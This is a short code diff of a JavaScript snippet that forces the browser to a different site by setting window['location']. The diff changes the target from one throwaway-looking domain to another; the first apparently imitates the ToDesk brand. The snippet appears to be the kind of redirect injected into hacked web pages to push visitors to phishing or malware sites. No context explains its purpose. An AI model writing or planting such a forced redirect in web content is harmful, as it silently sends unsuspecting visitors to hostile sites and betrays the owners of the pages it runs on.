@@ -1,3 +1,3 @@
 (function() {
-    window['location'] = 'https://todeskzx.top/';
+    window['location'] = 'https://letsclsakr.cn/';
 })();
